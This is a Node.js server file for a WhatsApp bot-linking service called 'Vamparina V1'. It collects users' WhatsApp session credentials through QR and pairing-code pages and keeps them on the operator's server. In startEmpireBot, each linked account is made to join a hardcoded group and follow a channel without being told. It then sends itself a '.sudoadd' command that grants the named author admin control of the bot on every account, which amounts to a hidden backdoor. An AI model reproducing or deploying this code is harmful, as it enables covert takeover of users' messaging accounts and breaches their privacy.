// ──────────────────────────────────────────────────────────────
// VAMPARINA V1 — ETERNAL EMPIRE BOT 2025
// GOD-KING: ARNOLD CHIRCHIR (+254703110780)
// FULLY WORKING ON RENDER • PAIR CODE • QR CODE • AUTO-JOIN EMPIRE
// ──────────────────────────────────────────────────────────────

// FIXES RENDER "APPLICATION LOADING" FOREVER (MUST BE FIRST LINE)
process.env.NODE_OPTIONS = "--max-old-space-size=512";

require('./settings')
const fs = require('fs')
const path = require('path')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    Browsers
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const QRCode = require('qrcode')

// ====================== FOLDERS ======================
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const TEMP_DIR = path.join(__dirname, 'temp_sessions')
const DATA_DIR = path.join(__dirname, 'data')

;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true })
})

// ====================== EMPIRE SETTINGS ======================
const KING_ARNOLD = "254703110780"
const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"   // ← CHANGE TO YOUR GROUP CODE
const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"      // ← OPTIONAL

const PORT = process.env.PORT || 3000
const activeBots = new Map()
const app = express()

app.use(express.json({ limit: '100mb' }))
app.use(express.urlencoded({ extended: true }))
app.use(express.static(__dirname))

// ====================== DASHBOARD ======================
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VAMPARINA V1 EMPIRE</title>
  <style>
    body {background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
    h1 {font-size:60px;text-shadow:0 0 30px lime;}
    p {font-size:28px;}
    a {color:lime;text-decoration:none;font-size:30px;margin:20px;display:block;}
    .soldiers {font-size:50px;color:gold;}
  </style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <p class="soldiers">ACTIVE SOLDIERS: ${activeBots.size}</p>
  <br>
  <a href="/qr">SCAN QR CODE</a>
  <a href="/pair">PAIR WITH CODE</a>
  <br><br>
  <b>KING ARNOLD CHIRCHIR • +254703110780</b>
  <p>LONG LIVE THE EMPIRE</p>
</body>
</html>
    `)
})

// ====================== QR CODE PAGE ======================
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    })

    let qrSent = false
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection } = update

        if (qr && !qrSent) {
            qrSent = true
            const qrImg = await QRCode.toDataURL(qr)
            res.send(`
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>SCAN QR</title>
<style>
  body {background:#000;color:#0f0;text-align:center;padding:30px;font-family:Arial;}
  h1 {font-size:50px;text-shadow:0 0 30px lime;}
  img {width:90%;max-width:400px;border:10px solid lime;border-radius:25px;margin:30px;}
  p {font-size:24px;}
</style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <img src="${qrImg}" alt="QR">
  <p>SCAN TO JOIN THE EMPIRE</p>
  <p><b>King Arnold Chirchir • +254703110780</b></p>
</body>
</html>`)
        }

        if (connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(10000)
            await startEmpireBot(sessionId, phone, finalPath)

            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    sock.ev.on('creds.update', saveCreds)
})

// ====================== PAIR CODE PAGE (100% WORKING 2025) ======================
app.get('/pair', async (req, res) => {
    let number = req.query.number?.replace(/[^0-9]/g, '').trim()

    if (!number || number.length < 9) {
        return res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>VAMPARINA V1 - PAIR</title>
  <style>
    body {background:#000;color:#0f0;font-family:Arial;text-align:center;padding:50px;}
    h1 {font-size:50px;text-shadow:0 0 30px lime;}
    input {padding:20px;font-size:28px;width:90%;max-width:500px;margin:20px;border:3px solid lime;background:#111;color:#0f0;border-radius:15px;text-align:center;}
    button {padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;font-weight:bold;}
  </style>
</head>
<body>
  <h1>VAMPARINA V1</h1>
  <p>Enter your number (e.g. 254703110780)</p>
  <form>
    <input type="text" name="number" placeholder="254703110780" value="${number||''}" required autofocus>
    <br><button type="submit">GET CODE</button>
  </form>
  <br><b>KING ARNOLD CHIRCHIR • +254703110780</b>
</body>
</html>`)
    }

    if (number.length === 9) number = '254' + number

    const tempId = 'pair_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Chrome", "Chrome", "120.0"],
        printQRInTerminal: false
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })
            await delay(10000)
            await startEmpireBot(sessionId, phone, finalPath)
            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(number)
                code = code.match(/.{1,4}/g).join('-')

                res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PAIR CODE READY</title>
  <style>
    body {background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
    h1 {font-size:60px;text-shadow:0 0 35px lime;}
    .code {font-size:100px;letter-spacing:25px;background:#111;padding:50px;border:10px solid lime;border-radius:30px;margin:50px auto;display:inline-block;}
    .copy {padding:25px 80px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;font-weight:bold;}
  </style>
</head>
<body>
  <h1>CODE READY</h1>
  <div class="code">${code}</div>
  <button class="copy" onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')">COPY CODE</button>
  <br><br>
  <a href="/pair" style="color:lime;font-size:28px;">Pair Another Number</a>
  <br><br>
  <p>Open WhatsApp → Linked Devices → Link with phone number → Enter code</p>
  <b>KING ARNOLD CHIRCHIR • +254703110780</b>
  <script>
    document.querySelector('.copy').addEventListener('click', function() {
      this.textContent = 'COPIED!';
      setTimeout(() => this.textContent = 'COPY CODE', 2000);
    });
  </script>
</body>
</html>`)
            } catch (err) {
                res.send(`<h1 style="color:red">ERROR</h1><p>${err.message}</p><br><a href="/pair" style="color:lime;font-size:28px;">← TRY AGAIN</a>`)
                fs.rmSync(tempPath, { recursive: true, force: true })
            }
        }, 5000)
    }

    sock.ev.on('creds.update', saveCreds)
})

// ====================== START EMPIRE BOT (AUTO-JOIN + SUDO) ======================
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    })

    activeBots.set(sessionId, { sock, phone })

    // Load your command handler
    sock.ev.on('messages.upsert', m => {
        try { require('./main')(sock, m) } catch {}
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → EMPIRE ONLINE`)
            await delay(15000)
            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch {}
            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId)
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
        }
    })

    sock.ev.on('creds.update', saveCreds)
}

// ====================== START SERVER ======================
app.listen(PORT, () => {
    console.clear()
    console.log(`
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 EMPIRE IS NOW LIVE                ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║   Dashboard → https://your-bot.onrender.com              ║
║   QR Code   → /qr                                        ║
║   Pair Code → /pair                                      ║
║                                                          ║
║           THE EMPIRE HAS AWAKENED                        ║
╚══════════════════════════════════════════════════════════╝
    `)
})